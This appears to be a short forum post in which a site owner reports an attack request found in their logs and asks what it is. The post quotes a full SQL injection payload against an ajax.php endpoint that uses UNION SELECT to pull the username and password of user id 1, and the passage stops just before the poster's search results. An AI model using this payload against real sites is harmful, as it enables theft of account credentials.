Subject: New Ajax SQL Injection Exploit?

I just detected this trying to my web apps a few hours ago:

GET /ajax.php?do=quick_replay&t=7+union+select+1,2,3,concat(0x7a33726f31,username,0x0d0a,password,0x7a33726f32),5,6,username,8,9,10,11,12,13,14,15,16,17+from+user+where+userid=1--
HTTP/1.1
Host:www.mysite.c0m:80
Connection:Close

I ran a Google search of that string a found this:
